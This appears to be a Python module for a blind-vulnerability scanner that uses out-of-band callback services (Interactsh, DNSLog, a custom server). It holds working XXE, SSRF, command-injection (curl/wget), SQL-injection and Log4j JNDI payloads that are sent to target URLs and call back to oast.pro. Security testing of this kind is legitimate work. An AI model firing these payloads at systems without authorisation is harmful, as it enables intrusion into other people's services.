#!/usr/bin/env python3
"""
OOB (Out-of-Band) 平台集成模块
支持: Burp Collaborator, Interactsh, DNSLog, 自建OOB服务器
用于盲漏洞检测: 盲XXE, 盲SSRF, 盲RCE, 盲SQLi等
"""

import hashlib
import logging
import time
import uuid
from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional

import requests

logger = logging.getLogger(__name__)

# 统一 HTTP 客户端工厂
try:
    from core.http import get_sync_client

    HAS_HTTP_FACTORY = True
except ImportError:
    HAS_HTTP_FACTORY = False


class OOBProvider(ABC):
    """OOB提供者基类"""

    @abstractmethod
    def generate_payload(self, identifier: str = None) -> Dict[str, str]:
        """生成OOB payload"""

    @abstractmethod
    def check_interactions(self, identifier: str) -> List[Dict[str, Any]]:
        """检查交互记录"""


class InteractshProvider(OOBProvider):
    """Interactsh OOB平台 (开源替代Burp Collaborator)"""

    def __init__(self, server: str = "oast.pro"):
        self.server = server
        self.session_id = None
        self.correlation_id = None
        self._init_session()

    def _init_session(self):
        """初始化会话"""
        try:
            # 生成唯一标识
            self.correlation_id = uuid.uuid4().hex[:16]
            self.session_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
        except Exception as e:
            logger.error(f"Interactsh初始化失败: {e}")

    def generate_payload(self, identifier: str = None) -> Dict[str, str]:
        """生成Interactsh payload"""
        if not identifier:
            identifier = uuid.uuid4().hex[:8]

        subdomain = f"{identifier}.{self.correlation_id}"

        return {
            "identifier": identifier,
            "dns": f"{subdomain}.{self.server}",
            "http": f"http://{subdomain}.{self.server}",
            "https": f"https://{subdomain}.{self.server}",
            "smtp": f"{subdomain}.{self.server}",
            "ldap": f"ldap://{subdomain}.{self.server}",
            "rmi": f"rmi://{subdomain}.{self.server}",
        }

    def check_interactions(self, identifier: str) -> List[Dict[str, Any]]:
        """检查交互记录 (需要interactsh-client)"""
        # 实际使用需要运行interactsh-client
        return []


class DNSLogProvider(OOBProvider):
    """DNSLog.cn OOB平台"""

    def __init__(self, domain: str = None, api_key: str = None):
        self.domain = domain
        self.api_key = api_key
        # 优先使用统一 HTTP 客户端工厂
        if HAS_HTTP_FACTORY:
            self.session = get_sync_client(force_new=True)
        else:
            self.session = requests.Session()

        if not domain:
            self._get_domain()

    def _get_domain(self):
        """获取DNSLog域名"""
        try:
            resp = self.session.get("http://www.dnslog.cn/getdomain.php", timeout=10)
            if resp.status_code == 200:
                self.domain = resp.text.strip()
        except Exception as e:
            logger.error(f"获取DNSLog域名失败: {e}")
            self.domain = None

    def generate_payload(self, identifier: str = None) -> Dict[str, str]:
        """生成DNSLog payload"""
        if not self.domain:
            return {"error": "DNSLog域名未初始化"}

        if not identifier:
            identifier = uuid.uuid4().hex[:8]

        subdomain = f"{identifier}.{self.domain}"

        return {
            "identifier": identifier,
            "dns": subdomain,
            "http": f"http://{subdomain}",
            "curl": f"curl http://{subdomain}",
            "ping": f"ping {subdomain}",
            "nslookup": f"nslookup {subdomain}",
        }

    def check_interactions(self, identifier: str = None) -> List[Dict[str, Any]]:
        """检查DNS记录"""
        try:
            resp = self.session.get("http://www.dnslog.cn/getrecords.php", timeout=10)
            if resp.status_code == 200:
                records = resp.json() if resp.text else []
                if identifier:
                    records = [r for r in records if identifier in str(r)]
                return records
        except Exception as e:
            logger.error(f"检查DNSLog记录失败: {e}")
        return []


class CustomOOBServer(OOBProvider):
    """自建OOB服务器"""

    def __init__(self, server_url: str, api_key: str = None):
        self.server_url = server_url.rstrip("/")
        self.api_key = api_key
        # 优先使用统一 HTTP 客户端工厂
        if HAS_HTTP_FACTORY:
            self.session = get_sync_client(force_new=True)
        else:
            self.session = requests.Session()
        if api_key:
            self.session.headers["Authorization"] = f"Bearer {api_key}"

    def generate_payload(self, identifier: str = None) -> Dict[str, str]:
        """生成自定义OOB payload"""
        if not identifier:
            identifier = uuid.uuid4().hex[:8]

        return {
            "identifier": identifier,
            "http": f"{self.server_url}/c/{identifier}",
            "dns": f"{identifier}.{self.server_url.replace('http://', '').replace('https://', '')}",
            "callback": f"{self.server_url}/callback/{identifier}",
        }

    def check_interactions(self, identifier: str) -> List[Dict[str, Any]]:
        """检查交互记录"""
        try:
            resp = self.session.get(f"{self.server_url}/api/interactions/{identifier}", timeout=10)
            if resp.status_code == 200:
                return resp.json().get("interactions", [])
        except Exception as e:
            logger.error(f"检查OOB记录失败: {e}")
        return []


@dataclass
class OOBManager:
    """OOB管理器 - 统一管理多个OOB平台"""

    providers: Dict[str, OOBProvider] = field(default_factory=dict)
    active_payloads: Dict[str, Dict] = field(default_factory=dict)
    interactions: List[Dict] = field(default_factory=list)

    def add_provider(self, name: str, provider: OOBProvider):
        """添加OOB提供者"""
        self.providers[name] = provider

    def generate_payloads(self, vuln_type: str = "generic") -> Dict[str, Any]:
        """为指定漏洞类型生成所有OOB payload"""
        identifier = f"{vuln_type}_{uuid.uuid4().hex[:6]}"
        payloads = {"identifier": identifier, "providers": {}}

        for name, provider in self.providers.items():
            try:
                payload = provider.generate_payload(identifier)
                payloads["providers"][name] = payload
            except Exception as e:
                logger.error(f"生成{name} payload失败: {e}")

        # 根据漏洞类型生成特定payload
        payloads["vuln_payloads"] = self._generate_vuln_specific(identifier, vuln_type)

        self.active_payloads[identifier] = payloads
        return payloads

    def _generate_vuln_specific(self, identifier: str, vuln_type: str) -> List[str]:
        """生成漏洞特定的payload"""
        callback = self._get_callback_url(identifier)
        if not callback:
            return []

        payloads = []

        if vuln_type in ["xxe", "generic"]:
            payloads.extend(
                [
                    f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{callback}">]><foo>&xxe;</foo>',
                    f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{callback}/evil.dtd">%xxe;]>',
                ]
            )

        if vuln_type in ["ssrf", "generic"]:
            payloads.extend(
                [
                    callback,
                    f"{callback}/ssrf",
                    f"http://{identifier}.oast.pro",
                ]
            )

        if vuln_type in ["rce", "generic"]:
            payloads.extend(
                [
                    f"curl {callback}/rce",
                    f"wget {callback}/rce",
                    f"ping -c 1 {identifier}.oast.pro",
                    f"nslookup {identifier}.oast.pro",
                ]
            )

        if vuln_type in ["sqli", "generic"]:
            payloads.extend(
                [
                    f"' AND LOAD_FILE('{callback}/sqli')--",
                    f"'; EXEC master..xp_dirtree '{callback}/sqli'--",
                ]
            )

        if vuln_type in ["log4j", "generic"]:
            payloads.extend(
                [
                    f"${{jndi:ldap://{identifier}.oast.pro/a}}",
                    f"${{jndi:dns://{identifier}.oast.pro}}",
                ]
            )

        return payloads

    def _get_callback_url(self, identifier: str) -> Optional[str]:
        """获取回调URL"""
        for name, provider in self.providers.items():
            payload = provider.generate_payload(identifier)
            if "http" in payload:
                return payload["http"]
        return None

    def check_all_interactions(self) -> List[Dict[str, Any]]:
        """检查所有提供者的交互记录"""
        all_interactions = []

        for identifier in self.active_payloads:
            for name, provider in self.providers.items():
                try:
                    interactions = provider.check_interactions(identifier)
                    for interaction in interactions:
                        interaction["provider"] = name
                        interaction["identifier"] = identifier
                        all_interactions.append(interaction)
                except Exception as e:
                    logger.error(f"检查{name}交互失败: {e}")

        self.interactions.extend(all_interactions)
        return all_interactions

    def wait_for_interaction(
        self, identifier: str, timeout: int = 30, interval: int = 2
    ) -> Optional[Dict]:
        """等待交互回调"""
        start_time = time.time()

        while time.time() - start_time < timeout:
            for name, provider in self.providers.items():
                interactions = provider.check_interactions(identifier)
                if interactions:
                    return {
                        "found": True,
                        "provider": name,
                        "interactions": interactions,
                        "wait_time": time.time() - start_time,
                    }
            time.sleep(interval)

        return {"found": False, "wait_time": timeout}


class BlindVulnScanner:
    """盲漏洞扫描器"""

    def __init__(self, oob_manager: OOBManager):
        self.oob = oob_manager
        self.results: List[Dict] = []

    def scan_blind_xxe(
        self, url: str, method: str = "POST", headers: Dict[str, str] = None
    ) -> Dict[str, Any]:
        """扫描盲XXE"""
        payloads = self.oob.generate_payloads("xxe")
        identifier = payloads["identifier"]

        results = {
            "vuln_type": "blind_xxe",
            "url": url,
            "identifier": identifier,
            "payloads_sent": 0,
            "vulnerable": False,
        }

        headers = headers or {"Content-Type": "application/xml"}

        for payload in payloads.get("vuln_payloads", []):
            try:
                if method.upper() == "POST":
                    requests.post(url, data=payload, headers=headers, timeout=10, verify=False)
                else:
                    requests.get(
                        url, params={"xml": payload}, headers=headers, timeout=10, verify=False
                    )
                results["payloads_sent"] += 1
            except Exception as exc:
                logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)

        # 等待回调
        time.sleep(5)
        interaction = self.oob.wait_for_interaction(identifier, timeout=15)

        if interaction and interaction.get("found"):
            results["vulnerable"] = True
            results["evidence"] = interaction

        self.results.append(results)
        return results

    def scan_blind_ssrf(self, url: str, param: str = "url", method: str = "GET") -> Dict[str, Any]:
        """扫描盲SSRF"""
        payloads = self.oob.generate_payloads("ssrf")
        identifier = payloads["identifier"]

        results = {
            "vuln_type": "blind_ssrf",
            "url": url,
            "parameter": param,
            "identifier": identifier,
            "payloads_sent": 0,
            "vulnerable": False,
        }

        for payload in payloads.get("vuln_payloads", []):
            try:
                if method.upper() == "POST":
                    requests.post(url, data={param: payload}, timeout=10, verify=False)
                else:
                    requests.get(url, params={param: payload}, timeout=10, verify=False)
                results["payloads_sent"] += 1
            except Exception as exc:
                logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)

        time.sleep(5)
        interaction = self.oob.wait_for_interaction(identifier, timeout=15)

        if interaction and interaction.get("found"):
            results["vulnerable"] = True
            results["evidence"] = interaction

        self.results.append(results)
        return results

    def scan_blind_rce(self, url: str, param: str = "cmd", method: str = "GET") -> Dict[str, Any]:
        """扫描盲RCE"""
        payloads = self.oob.generate_payloads("rce")
        identifier = payloads["identifier"]

        results = {
            "vuln_type": "blind_rce",
            "url": url,
            "parameter": param,
            "identifier": identifier,
            "payloads_sent": 0,
            "vulnerable": False,
        }

        for payload in payloads.get("vuln_payloads", []):
            try:
                if method.upper() == "POST":
                    requests.post(url, data={param: payload}, timeout=10, verify=False)
                else:
                    requests.get(url, params={param: payload}, timeout=10, verify=False)
                results["payloads_sent"] += 1
            except Exception as exc:
                logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)

        time.sleep(5)
        interaction = self.oob.wait_for_interaction(identifier, timeout=15)

        if interaction and interaction.get("found"):
            results["vulnerable"] = True
            results["evidence"] = interaction

        self.results.append(results)
        return results


def create_oob_manager(config: Dict[str, Any] = None) -> OOBManager:
    """创建OOB管理器的工厂函数"""
    manager = OOBManager()

    config = config or {}

    # 添加Interactsh (默认)
    interactsh_server = config.get("interactsh_server", "oast.pro")
    manager.add_provider("interactsh", InteractshProvider(interactsh_server))

    # 添加DNSLog
    if config.get("use_dnslog", True):
        manager.add_provider("dnslog", DNSLogProvider())

    # 添加自定义OOB服务器
    if config.get("custom_oob_url"):
        manager.add_provider(
            "custom", CustomOOBServer(config["custom_oob_url"], config.get("custom_oob_key"))
        )

    return manager
